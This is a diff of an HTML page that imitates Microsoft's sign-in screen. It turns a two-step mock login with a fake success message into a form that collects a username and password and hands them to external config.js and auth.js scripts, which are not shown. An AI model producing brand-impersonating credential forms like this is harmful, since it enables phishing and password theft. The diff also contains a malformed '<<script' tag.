@@ -143,14 +143,24 @@ button:hover{
         <div class="logo-text">Microsoft</div>
     </div>
 
-    <!-- EMAIL SCREEN -->
-    <div id="emailPage">
+    <form id="login-form">
+
         <h1>Sign in</h1>
 
         <input
-            type="text"
+            type="email"
             id="email"
-            placeholder="Email, phone, or Skype">
+            name="username"
+            placeholder="Email, phone, or Skype"
+            required>
+
+        <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Password"
+            required
+            style="margin-top:20px;">
 
         <div class="links">
             No account? <a href="#">Create one!</a>
@@ -161,76 +171,36 @@ button:hover{
         </div>
 
         <div class="actions">
-            <button onclick="showPassword()">Next</button>
+            <button type="submit" class="submit-button">
+                Sign in
+            </button>
         </div>
-    </div>
 
-    <!-- PASSWORD SCREEN -->
-    <div id="passwordPage" class="hidden">
+        <div id="form-message"></div>
 
-        <span class="back" onclick="showEmail()">
-            ← Back
-        </span>
+    </form>
 
-        <h1>Enter password</h1>
+    <div id="signed-in" hidden>
 
-        <div id="showEmail" class="email-display"></div>
+        <h1>Success</h1>
 
-        <input
-            type="password"
-            placeholder="Password">
+        <p>
+            Signed in as
+            <strong id="signed-in-email"></strong>
+        </p>
 
         <div class="actions">
-    <button onclick="loginSuccess()">Sign in</button>
-</div>
+            <button id="logout-button">
+                Sign out
+            </button>
+        </div>
+
     </div>
 
 </div>
 
-<script>
-function showPassword() {
-
-    const email = document.getElementById("email").value;
-
-    if(email.trim() === ""){
-        alert("Please enter your email.");
-        return;
-    }
-
-    document.getElementById("showEmail").textContent = email;
-
-    document.getElementById("emailPage")
-        .classList.add("hidden");
-
-    document.getElementById("passwordPage")
-        .classList.remove("hidden");
-}
-
-function showEmail() {
-    document.getElementById("passwordPage")
-        .classList.add("hidden");
-
-    document.getElementById("emailPage")
-        .classList.remove("hidden");
-}function loginSuccess() {
-
-    document.querySelector(".container").innerHTML = `
-        <div style="text-align:center;padding:40px;">
-            <h2>Signing you in...</h2>
-        </div>
-    `;
-
-    setTimeout(function() {
-
-        document.querySelector(".container").innerHTML = `
-            <h1>Success</h1>
-            <p>You have successfully signed in.</p>
-        `;
-
-    }, 1500);
-
-}
-</script>
+<<script src="config.js"></script>
+<script type="module" src="auth.js"></script>
 
 </body>
 </html>
